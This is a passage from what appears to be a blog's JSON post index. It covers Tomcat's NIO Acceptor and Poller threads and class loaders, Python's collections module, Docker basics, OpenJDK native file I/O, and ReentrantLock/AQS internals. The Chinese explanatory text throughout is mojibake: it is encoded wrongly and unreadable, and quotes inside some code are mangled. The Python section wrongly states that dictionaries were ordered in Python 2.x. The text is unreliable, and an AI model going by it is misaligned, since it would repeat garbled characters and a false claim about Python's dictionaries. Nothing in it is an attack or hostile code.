&quot;-ClientPoller&quot;); pollerThread.setPriority(threadPriority); pollerThread.setDaemon(true); pollerThread.start(); startAcceptorThread(); protected void startAcceptorThread() { acceptor = new Acceptor&lt;&gt;(this); String threadName = getName() + &quot;-Acceptor&quot;; acceptor.setThreadName(threadName); Thread t = new Thread(acceptor, threadName); t.setPriority(getAcceptorThreadPriority()); t.setDaemon(getDaemon()); t.start(); } æ‰€ä»¥è‡³å°‘åˆæ‹‰èµ·äº†ä¸¤æ¡çº¿ç¨‹ã€‚å…ˆæ¥çœ‹Acceptorè¿™ä¸ªçº¿ç¨‹,åœ¨runä¸­åšçš„äº‹æƒ…ï¼š socket = endpoint.serverSocketAccept(); endpoint.setSocketOptions() //NioEndpoint.setSocketOptions NioSocketWrapper socketWrapper = new NioSocketWrapper(channel, this); channel.setSocketWrapper(socketWrapper); socketWrapper.setReadTimeout(getConnectionTimeout()); socketWrapper.setWriteTimeout(getConnectionTimeout()); socketWrapper.setKeepAliveLeft(NioEndpoint.this.getMaxKeepAliveRequests()); socketWrapper.setSecure(isSSLEnabled()); poller.register(channel, socketWrapper); //è¿™é‡Œé¢è®¾å®šäº†NioSockertWrapperçš„interestOpsä¸ºSelectionKey.OP_READ //NioEndpoint.Poller.register PollerEvent r = null; r = new PollerEvent(socket, OP_REGISTER); // PollerEventå®ç°äº†runnableï¼Œåœ¨runé‡Œé¢ addEvent(r); //å¾€ä¸€ä¸ªSynchronizedQueueé‡Œé¢offeräº‹ä»¶ æ€»ç»“ä¸€ä¸‹ï¼ŒAcceptorè¿™æ¡çº¿ç¨‹å°±æ˜¯ä¸æ–­åœ°æ¥å—æ–°çš„Socketï¼Œå¹¶åˆ›å»ºNioSockertWrapperå¯¹è±¡ï¼Œæ³¨å†ŒNioSockertWrapperçš„interestOpsä¸ºSelectionKey.OP_REGISTERï¼ˆä½†è¿™é‡Œè¿˜æ²¡æœ‰è°ƒç”¨ç³»ç»Ÿapiå»æ³¨å†Œï¼Œæ³¨æ„è¿™é‡Œæ˜¯OP_REGISTERï¼‰ å†æ¥çœ‹ClientPollerè¿™æ¡çº¿ç¨‹:ClientPolleræ˜¯å…ˆäºAcceptorçº¿ç¨‹è·‘èµ·æ¥çš„ï¼Œçœ‹ä¸€ä¸‹runæ–¹æ³•çš„å®ç°NioEndPoint.Poller.run public void run() { while (true) { hasEvents = events(); int keyCount = selector.select(selectorTimeout); while (iterator != null &amp;&amp; iterator.hasNext()) { SelectionKey sk = iterator.next(); NioSocketWrapper socketWrapper = (NioSocketWrapper) sk.attachment(); // Attachment may be null if another thread has called // cancelledKey() if (socketWrapper == null) { iterator.remove(); } else { iterator.remove(); processKey(sk, socketWrapper); //è¿™é‡Œæ˜¯å¤„ç†å…·ä½“çš„äº‹ä»¶çš„ï¼Œä¼šå°†ä¸šåŠ¡é€»è¾‘åˆ†å‘ç»™çº¿ç¨‹æ±  } } // Process timeouts timeout(keyCount,hasEvents); } } //ä»SynchronizedQueueé‡Œé¢å–å‡ºPollEventï¼Œä¸€ä¸ªä¸ªæ‰§è¡Œ public boolean events() { boolean result = false; PollerEvent pe = null; for (int i = 0, size = events.size(); i &lt; size &amp;&amp; (pe = events.poll()) != null; i++ ) { try { pe.run(); pe.reset(); } catch ( Throwable x ) { log.error(sm.getString(&quot;endpoint.nio.pollerEventError&quot;), x); } } return result; } //PollEventçš„runæ–¹æ³•é‡Œé¢å°±æœ‰è°ƒç”¨java nioç³»ç»Ÿapiäº† PollEvent.run ```java @Override public void run() { if (interestOps == OP_REGISTER) { try { socket.getIOChannel().register(socket.getSocketWrapper().getPoller().getSelector(), SelectionKey.OP_READ, socket.getSocketWrapper()); //è¿™é‡Œå°±æ˜¯è°ƒç”¨äº†nioçš„api } catch (Exception x) { log.error(sm.getString(&quot;endpoint.nio.registerFail&quot;), x); } }else { // ã€‚ã€‚ } } // å…·ä½“è°ƒç”¨çš„ç³»ç»Ÿæ–¹æ³•æ˜¯: AbstractSelectableChannel.register(Selector sel, int ops, Object att) //ä¸‰ä¸ªå‚æ•°ï¼Œæœ€åä¸€ä¸ªæ˜¯attachMentï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢BlockPolleråœ¨runæ–¹æ³•ä¸­æå–å‡ºæ¥çš„attachment //å›åˆ°timeoutæ–¹æ³•é‡Œï¼Œæ³¨é‡Šè¯´è¯¥æ–¹æ³•åœ¨Pollerçš„æ¯ä¸€ä¸ªloopä¸­éƒ½ä¼šè¢«è°ƒç”¨ã€‚ protected void timeout(int keyCount, boolean hasEvents) { long now = System.currentTimeMillis(); // This method is called on every loop of the Poller. Don&#39;t process // timeouts on every loop of the Poller since that would create too // much load and timeouts can afford to wait a few seconds. // However, do process timeouts if any of the following are true: // - the selector simply timed out (suggests there isn&#39;t much load) // - the nextExpiration time has passed // - the server socket is being closed //è¿™é‡Œé¢ä¸»è¦çš„åˆ¤æ–­æ˜¯å¦æ˜¯è¯»è¶…æ—¶æˆ–è€…å†™è¶…æ—¶äº†ï¼Œå¦‚æœæ˜¯çš„è¯ï¼ŒCancelKey } ClientPollerçº¿ç¨‹å°±æ˜¯è´Ÿè´£æ‰§è¡ŒSelectoré‚£ä¸€å¥—ï¼Œå‡ºç°äº‹ä»¶ä¹‹åå°±åˆ†å‘ç»™å·¥ä½œçº¿ç¨‹ï¼ˆSocketProcessorï¼‰ï¼Œå·¥ä½œçº¿ç¨‹çš„åå­—æ˜¯è¿™ä¹ˆèµ·çš„: TaskThreadFactory tf = new TaskThreadFactory(getName() + â€œ-exec-â€œ, daemon, getThreadPriority()); æ‰€ä»¥åœ¨æ–­ç‚¹é‡Œé¢èƒ½å¤Ÿçœ‹åˆ°http-nio-8080-exec-1 ,http-nio-8080-exec-2â€¦è¿™ä¸ªçº¿ç¨‹æ± å°±æ˜¯ä¸»è¦çš„å¤„ç†ä¸šåŠ¡é€»è¾‘çš„çº¿ç¨‹ã€‚ tomcatç±»åŠ è½½å™¨(é‡ç‚¹)é¦–å…ˆï¼ŒTomcatçš„ç±»åŠ è½½æœºåˆ¶æ˜¯è¿èƒŒäº†åŒäº²å§”æ´¾æ¨¡å‹çš„ï¼ˆwebappClassLoaderåŠ è½½è‡ªå·±çš„ç›®å½•ä¸‹çš„classæ–‡ä»¶ï¼Œä¸ä¼šä¼ é€’ç»™çˆ¶ç±»åŠ è½½å™¨ã€‚ï¼‰ Tomcaté‡Œé¢ä¸»è¦çš„classLoaderåŒ…æ‹¬ï¼šCommonClassLoader /common/ ä¸‹é¢çš„classCatalinaClassLoader /server/ ä¸‹é¢çš„classå½’å®ƒSharedClassLoader /shared/ ä¸‹é¢çš„å½’å®ƒWebappClassLoader /WebApp/WEB-INF/ ä¸‹é¢çš„å½’å®ƒ æ¯ä¸€ä¸ªWebåº”ç”¨ç¨‹åºå¯¹åº”ä¸€ä¸ªWebAppç±»åŠ è½½å™¨ï¼Œæ¯ä¸€ä¸ªjspæ–‡ä»¶å¯¹åº”ä¸€ä¸ªjspç±»åŠ è½½å™¨ã€‚ åœ¨org.apache.catalina.startup.BootStrap.javaä¸­ï¼Œæœ‰åˆå§‹åŒ–classLoaderçš„æ–¹æ³• initClassLoaders(); Thread.currentThread().setContextClassLoader(catalinaLoader); SecurityClassLoad.securityClassLoad(catalinaLoader); å½“ä¸€ä¸ªåº”ç”¨å¯åŠ¨çš„æ—¶å€™ï¼Œä¼šä¸ºå…¶åˆ›å»ºå¯¹åº”çš„WebappClassLoaderStandardContext.startInternal if (getLoader() == null) { WebappLoader webappLoader = new WebappLoader(getParentClassLoader()); webappLoader.setDelegate(getDelegate()); setLoader(webappLoader); } classLoaderæœ€ç»ˆæ˜¯ç”¨æ¥loadClassçš„ï¼Œè¿™ä¸ªæ–¹æ³•åœ¨WebAppClassLoaderBase.loadClassæ–¹æ³•ä¸­ã€‚ä½¿ç”¨äº†ä¸€ä¸ª clazz = Class.forName(name, false, parent); // class.forNameè¿˜æœ‰ä¸€ä¸ªä¸‰ä¸ªå‚æ•°çš„æ–¹æ³•ã€‚ã€‚ã€‚ã€‚ tbd tomcatæ”¯æŒå¼€å¯sendFileapacheæ”¯æŒzero-copy å‚è€ƒtomcatæºç è§£ætomcatå®˜æ–¹æ–‡æ¡£å…³äºclassloaderçš„è§£é‡Š","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"},{"name":"tbd","slug":"tbd","permalink":"https://haldir65.github.io/tags/tbd/"}]},{"title":"Pythonä¸­çš„é›†åˆç±»","date":"2019-07-26T22:21:38.000Z","path":"2019/07/26/2019-07-26-python-collections/","text":"å¾ˆå¤šé«˜çº§è¯­è¨€éƒ½æœ‰æˆç†Ÿçš„é›†åˆç±»ï¼Œæ¯”å¦‚Javaæœ‰å¾ˆä¼˜ç§€çš„é›†åˆï¼ˆè‡ªåŠ¨æ‰©å®¹ï¼Œå¿«é€Ÿå¤±è´¥ï¼Œå¹¶å‘é›†åˆç±»ï¼‰ï¼ŒPythonä¹Ÿä¸ä¾‹å¤–ã€‚ 1. namedtuple()plain_tuple = (10,11,12,13) plain_tuple[0] ##10 plain_tuple[3] ##13 æ™®é€šçš„tupleåªèƒ½æ ¹æ®ä¸‹æ ‡æ¥è·å–å…ƒç´ namedtupleä½¿å¾—å¤–éƒ¨èƒ½å¤Ÿä»¥è‡ªå®šä¹‰çš„keyè·å–value from collections import namedtuple fruit = namedtuple(&#39;fruit&#39;,&#39;number variety color&#39;) guava = fruit(number=2,variety=&#39;HoneyCrisp&#39;,color=&#39;green&#39;) apple = fruit(number=5,variety=&#39;Granny Smith&#39;,color=&#39;red&#39;) ##guava.color ##&#39;green&#39; ##apple.variety ##&#39;Granny Smith&#39; 2. CounterCounteræ˜¯dictçš„å­ç±» from collections import Counter c = Counter(&#39;abcacdabcacd&#39;) print(c) ## Counter({&#39;a&#39;: 4, &#39;c&#39;: 4, &#39;b&#39;: 2, &#39;d&#39;: 2}) å…¶å®å°±æ˜¯è®¡ç®—æ¯ä¸€ä¸ªå­—æ¯å‡ºç°äº†å‡ æ¬¡ lst = [5,6,7,1,3,9,9,1,2,5,5,7,7] c = Counter(lst) print(c) ## Counter({5: 3, 7: 3, 1: 2, 9: 2, 6: 1, 3: 1, 2: 1}) s = &#39;the lazy dog jumped over another lazy dog&#39; words = s.split() print(Counter(words).most_common(3)) ##[(&#39;lazy&#39;, 2), (&#39;dog&#39;, 2), (&#39;the&#39;, 1)] most_commonæ˜¯counterçš„ä¸€ä¸ªæ–¹æ³•ï¼Œç»™å‡ºå‰nä¸ªå‡ºç°æ¬¡æ•°æœ€å¤šçš„ 3. defaultdictd = {} print(d[&#39;A&#39;]) ## print(d[&#39;A&#39;]) KeyError: &#39;A&#39; from collections import defaultdict s = [(&#39;yellow&#39;, 1), (&#39;blue&#39;, 2), (&#39;yellow&#39;, 3), (&#39;blue&#39;, 4), (&#39;red&#39;, 1)] d = defaultdict(list) ## å°†ä¸€ä¸ªlistè½¬æˆdictçš„æ–¹å¼ for k, v in s: d[k].append(v) sorted(d.items()) 4.OrderedDictOrderedDictæ˜¯dictionaryçš„å­ç±»ï¼Œè¿­ä»£é¡ºåºä¸åˆå§‹inserté¡ºåºä¿æŒä¸€è‡´ã€‚å…³äºpythonçš„dictionaryï¼Œ2.xçš„æ—¶å€™æ˜¯æœ‰åºçš„ï¼Œ3.0-3.5çš„æ—¶å€™æ˜¯æ— åºçš„ï¼Œ3.6å¼€å§‹åˆå˜å¾—æœ‰åºäº†ã€‚Modern Dictionaries by Raymond Hettinger d = {&#39;banana&#39;: 3, &#39;apple&#39;: 4, &#39;pear&#39;: 1, &#39;orange&#39;: 2} for k,v in d.items(): print(&quot;key = {0}, value = {1}&quot;.format(k,v)) ##key = banana, value = 3 # key = apple, value = 4 # key = pear, value = 1 # key = orange, value = 2 d = OrderedDict(sorted(d.items(), key=lambda t: t[0])) for k,v in d.items(): print(&quot;key = {0}, value = {1}&quot;.format(k,v)) # key = apple, value = 4 # key = banana, value = 3 # key = orange, value = 2 # key = pear, value = 1 python3.6å¼€å§‹dictionaryæ˜¯æœ‰åºçš„ ä»¥åŠå…¶å®ç°ç»†èŠ‚ï¼ˆä¸»è¦æ˜¯ä¸ºäº†èŠ‚çœå†…å­˜ï¼‰ å‚è€ƒpython collectionsofficial docs for python builtin collections official docs","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"}]},{"title":"dockerå­¦ä¹ ç¬”è®°","date":"2019-07-21T20:18:17.000Z","path":"2019/07/21/2019-07-21-docker-cheatsheet/","text":"dockerç›¸å…³çš„çŸ¥è¯†ç‚¹ sudo apt install docker-compose é¦–å…ˆçš„é¦–å…ˆï¼Œdockerå‘½ä»¤ç”¨sudoæƒé™è¿è¡Œï¼Œä¼šå°‘å¾ˆå¤šéº»çƒ¦docker image æ˜¯snapshot, è€Œcontaineræ˜¯docker imageçš„è¿è¡Œå®ä¾‹ youtube ä¸Šæœ‰äººåœ¨ Digital Ocean çš„ vps ä¸Šå®‰è£… dockerï¼Œä¸»è¦ä½œç”¨å°±æ˜¯å°†ä¸€ä¸ªå¤æ‚çš„æ“ä½œç³»ç»Ÿæ‰“åŒ…æˆä¸€ä¸ªä¸‹è½½å³ç”¨çš„å®¹å™¨ã€‚è¿›å…¥å®¹å™¨ä¸­ï¼Œå¯ä»¥åƒåœ¨å®é™…çš„æ“ä½œç³»ç»Ÿä¸­ä¸€æ ·è¿è¡ŒæŒ‡ä»¤ã€‚æ‰€ä»¥è™šæ‹ŸåŒ–çš„æœºå™¨éšæ—¶å¯ä»¥ä½¿ç”¨å…¶ä»–æ“ä½œç³»ç»Ÿã€‚how-to-install-and-use-docker-on-ubuntu-16-04 dockerå¸¸ç”¨çš„å‘½ä»¤æœ‰é‚£ä¹ˆå‡ æ¡ docker run hello-worlddocker search ubuntudocker pull ubuntudocker run ubuntu ## è¿›å…¥ubuntuè¿™ä¸ªcontainerdocker imagesdocker run -it ubuntuexit docker-composeä½¿ç”¨docker-compose.ymlçš„æ–¹å¼è¦æ¯”è¾“å…¥dockerå‘½ä»¤æ¥çš„ç®€å•çš„å¤šã€‚å°±æ˜¯å°†å‚æ•°å†™å…¥docker-compose.ymlè¿™ä¸ªæ–‡ä»¶ï¼Œç„¶åè¿è¡Œdocker-compose up -då‘½ä»¤çš„æ–¹å¼ã€‚ docker run -p 3000:3000 -ti dummy-app ## æ¯æ¬¡éƒ½éœ€è¦è¾“å…¥ä¸€å¤§æ®µå‘½ä»¤è¡Œå‚æ•°å¾ˆçƒ¦äººçš„ï¼Œæ‰€ä»¥æŠŠé…ç½®å†™åœ¨ä¸€ä¸ªdocker-compose.ymlæ–‡ä»¶é‡Œé¢ï¼Œæ¯æ¬¡åªéœ€è¦docker-compose upå°±å¯ä»¥äº†ã€‚ è¿™ä¸¤æ¡å‘½ä»¤ç”¨äºè‡ªå·±åœ¨æœ¬åœ°æ‰“ä¸€ä¸ªdocker imagedocker build -t /node-web-app .docker build -t packsdkandroiddocker.image -f ./scripts/PackSdkDockerfile . æ³¨æ„ä½ ä¿®æ”¹äº†Dockerfileä¹‹åè¦é‡æ–°è·‘ä¸€édocker build -t /node-web-app .æ¯æ¬¡ä¿®æ”¹ä¹‹åé‡æ–°æ‰“image dockerä¼šåœ¨/var/lib/dockeræ–‡ä»¶å¤¹é‡Œåƒæ‰å¤§é‡ç©ºé—´ï¼Œé‡Šæ”¾ç©ºé—´çš„è¯ docker system prune -a ç”¨docker hostä¸€ä¸ªnode js appã€‚å®æµ‹ä¸‹æ¥imageå¤§å°åœ¨600MBå·¦å³ï¼Œå†…å­˜å ç”¨200MBå·¦å³ã€‚ ç”¨dockerè¿è¡Œä¸€ä¸ªnode mongodbåº”ç”¨ äº²æµ‹æœ‰æ•ˆnodeçš„å®˜æ–¹imageå¤ªå¤§äº†ï¼Œalpine-nodeå ç”¨çš„ç£ç›˜ç©ºé—´æ›´å° å‚è€ƒhow-to-launch-containers-with-docker-compose","tags":[{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"openjdkæºç è§£æ[ä¸€]","date":"2019-07-13T21:06:23.000Z","path":"2019/07/13/2019-07-13-openjdk-codegrep_01/","text":"openjdkéƒ¨åˆ†æºç è§£æ(æ–‡ä»¶IO),javaå±‚ä»¥åŠcè¯­è¨€å±‚çš„åˆ†æ File IOIOUtilsFileChannel å›é¡¾ä¸€ä¸‹Cè¯­è¨€æä¾›çš„æ“ä½œæ–‡ä»¶çš„api1 .è¯»å†™(åˆ›å»º)æ–‡ä»¶ #include &lt;stdio.h&gt; FILE *fopen( const char * filename, const char * mode ); //å®šä¹‰åœ¨æ ‡å‡†ä¸­çš„ï¼Œæ‰€ä»¥æ˜¯è·¨å¹³å°çš„ int fclose( FILE *fp ); //å…³é—­æ–‡ä»¶ æ¨¡å¼ æè¿° r æ‰“å¼€ä¸€ä¸ªå·²æœ‰çš„æ–‡æœ¬æ–‡ä»¶ï¼Œå…è®¸è¯»å–æ–‡ä»¶ã€‚ w æ‰“å¼€ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå…è®¸å†™å…¥æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™ä¼šåˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ã€‚åœ¨è¿™é‡Œï¼Œæ‚¨çš„ç¨‹åºä¼šä»æ–‡ä»¶çš„å¼€å¤´å†™å…¥å†…å®¹ã€‚å¦‚æœæ–‡ä»¶å­˜åœ¨ï¼Œåˆ™è¯¥ä¼šè¢«æˆªæ–­ä¸ºé›¶é•¿åº¦ï¼Œé‡æ–°å†™å…¥ã€‚ a æ‰“å¼€ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œä»¥è¿½åŠ æ¨¡å¼å†™å…¥æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™ä¼šåˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ã€‚åœ¨è¿™é‡Œï¼Œæ‚¨çš„ç¨‹åºä¼šåœ¨å·²æœ‰çš„æ–‡ä»¶å†…å®¹ä¸­è¿½åŠ å†…å®¹ã€‚ r+ æ‰“å¼€ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå…è®¸è¯»å†™æ–‡ä»¶ã€‚ w+ æ‰“å¼€ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå…è®¸è¯»å†™æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™æ–‡ä»¶ä¼šè¢«æˆªæ–­ä¸ºé›¶é•¿åº¦ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™ä¼šåˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ã€‚ a+ æ‰“å¼€ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå…è®¸è¯»å†™æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™ä¼šåˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ã€‚è¯»å–ä¼šä»æ–‡ä»¶çš„å¼€å¤´å¼€å§‹ï¼Œå†™å…¥åˆ™åªèƒ½æ˜¯è¿½åŠ æ¨¡å¼ã€‚ int fputs( const char *s, FILE *fp ); //å°†å­—ç¬¦ä¸²så†™å…¥æ–‡ä»¶ä¸­ char *fgets( char *buf, int n, FILE *fp ); //ä»fpæŒ‡å‘çš„è¾“å…¥æµä¸­è¯»å–n-1ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸”è‡ªåŠ¨è¿½åŠ ä¸€ä¸ª null å­—ç¬¦æ¥ç»ˆæ­¢å­—ç¬¦ä¸² å›åˆ°javaè¿™ä¸€ç«¯ï¼Œåˆ›å»ºä¸€ä¸ªæ–‡ä»¶File file = new File(â€œc:\\somefile.txtâ€) åªæ˜¯åˆ›å»ºäº†ä¸€ä¸ªjava objectã€‚Fileçš„ä¸€äº›æ–¹æ³•ä»£ç†ç»™äº†FileSystemè¿™ä¸ªæŠ½è±¡ç±»ï¼Œåœ¨unixå¹³å°ä¸Šçš„å®ç°æ˜¯UnixFileSystem.javaã€‚ ä¾‹å¦‚File.existsæ–¹æ³•ï¼Œæœ€ç»ˆè¿›å…¥FileSystem.getBooleanAttributes0ã€‚è¿™æ˜¯ä¸€ä¸ªnativeæ–¹æ³•,å¯¹åº”çš„å®ç°åœ¨UnixFileSystem_md.cä¸­ static jboolean statMode(const char *path, int *mode) { struct stat64 sb; if (stat64(path, &amp;sb) == 0) { *mode = sb.st_mode; return JNI_TRUE; } return JNI_FALSE; } JNIEXPORT jint JNICALL Java_java_io_UnixFileSystem_getBooleanAttributes0(JNIEnv *env, jobject this, jobject file) { jint rv = 0; WITH_FIELD_PLATFORM_STRING(env, file, ids.path, path) { int mode; if (statMode(path, &amp;mode)) { int fmt = mode &amp; S_IFMT; rv = (jint) (java_io_FileSystem_BA_EXISTS | ((fmt == S_IFREG) ? java_io_FileSystem_BA_REGULAR : 0) | ((fmt == S_IFDIR) ? java_io_FileSystem_BA_DIRECTORY : 0)); } } END_PLATFORM_STRING(env, path); return rv; } // S_IFMTæ˜¯ä¸€ä¸ªæ©ç ï¼Œ S_IFREGè¡¨ç¤ºæ˜¯ä¸€ä¸ªæ™®é€šæ–‡ä»¶ï¼Œ S_IFDIRè¡¨ç¤ºæ˜¯ä¸€ä¸ªç›®å½•ã€‚è¿”å›å€¼æ˜¯ä¸€ä¸ªintï¼ˆå…¶ä¸­4ä½è¢«åˆ†åˆ«ç”¨äºå­˜å‚¨BA_HIDDENï¼ŒBA_DIRECTORYï¼ŒBA_REGULARï¼ŒBA_EXISTSï¼‰ï¼Œè¶³ä»¥è¡¨è¾¾æ–‡ä»¶çš„è¿™å‡ ç§å¸¸ç”¨å±æ€§ã€‚javaå±‚è·å–å¯¹åº”çš„å±æ€§åï¼Œè¿›è¡Œä½è¿ç®—å°±èƒ½çŸ¥é“è¿™ä¸ªæ–‡ä»¶çš„å±æ€§äº†ã€‚ æ–‡ä»¶è¯»å†™ä»¥åŠFileDescriptoræ–‡ä»¶æè¿°ç¬¦åœ¨unixç³»ç»Ÿä¸Šæ˜¯éè´Ÿçš„intï¼Œç”¨äºä»£è¡¨ä¸€ä¸ªæ–‡ä»¶ã€‚javaå±‚çš„FileDescriptorä¸­åŒ…è£¹äº†ä¸€ä¸ªint fdã€‚è¯»å†™æ–‡ä»¶éƒ½éœ€è¦é€šè¿‡FileInputStreamè¿›è¡Œï¼Œæ„é€ å‡½æ•°ä¸­æœ‰ä¸€ä¸ªopenæ–¹æ³•ï¼Œå¯¹åº”cè¯­è¨€çš„æ–¹æ³•åœ¨FileInputStream.cä¸­ JNIEXPORT void JNICALL Java_java_io_FileInputStream_open(JNIEnv *env, jobject this, jstring path) { fileOpen(env, this, path, fis_fd, O_RDONLY); } fileOpençš„å®ç°åœ¨io_util_md.cä¸­ void fileOpen(JNIEnv *env, jobject this, jstring path, jfieldID fid, int flags) { WITH_PLATFORM_STRING(env, path, ps) { FD fd; #if defined(__linux__) || defined(_ALLBSD_SOURCE) /* Remove trailing slashes, since the kernel won&#39;t */ char *p = (char *)ps + strlen(ps) - 1; while ((p &gt; ps) &amp;&amp; (*p == &#39;/&#39;)) *p-- = &#39;\\0&#39;; #endif fd = JVM_Open(ps, flags, 0666); if (fd &gt;= 0) { SET_FD(this, fd, fid); } else { throwFileNotFoundException(env, path); } } END_PLATFORM_STRING(env, ps); } JVM_OPENæ˜¯jvmçš„æ–¹æ³•ï¼Œä¸å±äºjdkäº†ï¼Œè¦å»hotSpoté‡Œé¢æŸ¥çœ‹å¯¹åº”çš„å®ç°ï¼š// åœ¨/hotspot/src/share/vm/prims/jvm.cpp ï¼ˆcppæˆ‘ä¸ç†Ÿï¼Œæ®è¯´è¿™é‡Œé¢æœ€ç»ˆèµ°çš„æ˜¯ open64æ–¹æ³•ï¼‰ è¿™é‡Œè¦æä¸€å¥ï¼Œjvmä¸æ­¢oracleä¸€å®¶ï¼Œè¿˜åŒ…æ‹¬OpenJDKï¼ŒSUN JVMï¼ŒIBM JVMï¼Œéƒ½æ˜¯å¯¹java specificationçš„implementationã€‚ æ–‡ä»¶è¯»å†™javaè¿™è¾¹è¯»å–æ–‡ä»¶ç”¨çš„æ˜¯FileInputStreamï¼Œä¸‹é¢æ–¹æ³•è¡¨ç¤ºè¯»å–ä¸€ä¸ªByte private native int read0() throws IOException; å¯¹åº”openjdkçš„å®ç°åœ¨FileInputStream.cæ–‡ä»¶ä¸­ JNIEXPORT jint JNICALL Java_java_io_FileInputStream_read0(JNIEnv *env, jobject this) { return readSingle(env, this, fis_fd); } readSingleåœ¨io_util.cä¸­ jint readSingle(JNIEnv *env, jobject this, jfieldID fid) { jint nread; char ret; FD fd = GET_FD(this, fid); if (fd == -1) { JNU_ThrowIOException(env, &quot;Stream Closed&quot;); return -1; } nread = IO_Read(fd, &amp;ret, 1); if (nread == 0) { /* EOF */ return -1; } else if (nread == -1) { /* error */ JNU_ThrowIOExceptionWithLastError(env, &quot;Read error&quot;); } return ret &amp; 0xFF; } // IO_ReadæŒ‡å‘io_util_md.cä¸­çš„handleReadæ–¹æ³• ssize_t handleRead(FD fd, void *buf, jint len) { ssize_t result; RESTARTABLE(read(fd, buf, len), result); return result; } cè¯­è¨€çš„readæ–¹æ³•: å¤´æ–‡ä»¶ï¼š#include &lt;unistd.h&gt; å®šä¹‰å‡½æ•°ï¼šssize_t read(int fd, void * buf, size_t count); å‡½æ•°è¯´æ˜ï¼šread()ä¼šæŠŠå‚æ•°fd æ‰€æŒ‡çš„æ–‡ä»¶ä¼ é€count ä¸ªå­—èŠ‚åˆ°buf æŒ‡é’ˆæ‰€æŒ‡çš„å†…å­˜ä¸­. è‹¥å‚æ•°count ä¸º0, åˆ™read()ä¸ä¼šæœ‰ä½œç”¨å¹¶è¿”å›0. è¿”å›å€¼ä¸ºå®é™…è¯»å–åˆ°çš„å­—èŠ‚æ•°, å¦‚æœè¿”å›0, è¡¨ç¤ºå·²åˆ°è¾¾æ–‡ä»¶å°¾æˆ–æ˜¯æ— å¯è¯»å–çš„æ•°æ®,æ­¤å¤–æ–‡ä»¶è¯»å†™ä½ç½®ä¼šéšè¯»å–åˆ°çš„å­—èŠ‚ç§»åŠ¨. cloneæ–¹æ³•è¦æ±‚è¿™ä¸ªclassæ˜¯implement cloneableæ¥å£çš„ï¼Œé¦–å…ˆå°±æ˜¯æ£€æŸ¥æ˜¯å¦å®ç°äº†cloneableæ¥å£ã€‚ï¼ˆæ•°ç»„è¢«è®¤ä¸ºæ˜¯å®ç°äº†è¯¥æ¥å£ï¼‰Objectå¹¶æœªå®ç°cloneableæ¥å£ï¼ŒObject.cloneæ–¹æ³•æ˜¯ä¸€ä¸ªprotectedçš„æ–¹æ³•ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥è°ƒç”¨ï¼Œå…³æ³¨è¿™ä¸ªæ–¹æ³•çš„java docï¼Œè¯´ç›´æ¥è°ƒç”¨object.cloneä¼šæŠ›å¼‚å¸¸ï¼Œä¸è¿‡ç›®å‰çœ‹æ¥ï¼Œå¤–éƒ¨ä¹Ÿæ²¡æœ‰åŠæ³•ç›´æ¥è°ƒç”¨åˆ°ä¸€ä¸ªobject.cloneæ–¹æ³•ã€‚super.cloneæ–¹æ³•åœ¨openjdkä¸­çš„å®ç° å‚è€ƒopenjdkæ˜¯å¦‚ä½•è¯»å–.classæ–‡ä»¶çš„openjdkæºç åˆ†æhotspotæºç ","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"}]},{"title":"AbstractQueuedSynchronizeræºç åˆ†æ","date":"2019-07-05T08:59:54.000Z","path":"2019/07/05/2019-07-05-abstractQueuedSynchronizer/","text":"å…³äºjava.util.concurrent.locks.AbstractQueuedSynchronizer,è¿™ä¸ªç±»æ˜¯jucçš„åŸºç¡€ã€‚ReentrantLockä¸­ï¼ŒThreadPoolExecutorä¸­ï¼ŒCountDownLatchä¸­éƒ½æœ‰ç”¨åˆ°ã€‚ å…ˆçœ‹java docä¸­æ˜¯æ€æ ·æè¿°çš„å§:Provides a framework for implementing blocking locks and related synchronizers (semaphores, events, etc) that rely on first-in-first-out (FIFO) wait queues. é€šå¸¸ä½¿ç”¨ReentrantLockçš„æ—¶å€™ï¼Œéƒ½æ˜¯è¿™æ ·çš„ reentrantLock.lock(); try { // æ‰§è¡Œä»£ç ... } finally { // é‡Šæ”¾é” reentrantLock.unlock(); } æ¥çœ‹çœ‹å†…éƒ¨å®ç°ReentrantLock.lockæ–¹æ³• public void lock() { sync.lock(); } /** * Sync object for non-fair locks é»˜è®¤æ˜¯éå…¬å¹³çš„Syncï¼Œéå¸¸çŸ­ï¼Œä¸»è¦çš„é€»è¾‘éƒ½åœ¨çˆ¶ç±»AQSä¸­ */ static final class NonfairSync extends Sync { /** * Performs lock. Try immediate barge, backing up to normal * acquire on failure. */ final void lock() { if (compareAndSetState(0, 1)) setExclusiveOwnerThread(Thread.currentThread()); else acquire(1); } protected final boolean tryAcquire(int acquires) { return nonfairTryAcquire(acquires); } } static final class FairSync extends Sync { final void lock() { acquire(1); } public final void acquire(int arg) { if (!tryAcquire(arg) &amp;&amp; acquireQueued(addWaiter(Node.EXCLUSIVE), arg)) selfInterrupt(); } } acquireè¿™ä¸ªæ–¹æ³•ä¸»è¦åœ¨è¿™ç¯‡æ–‡ç« é‡Œï¼Œå†™çš„éå¸¸å¥½ã€‚è¿™ç¯‡æ–‡ç« 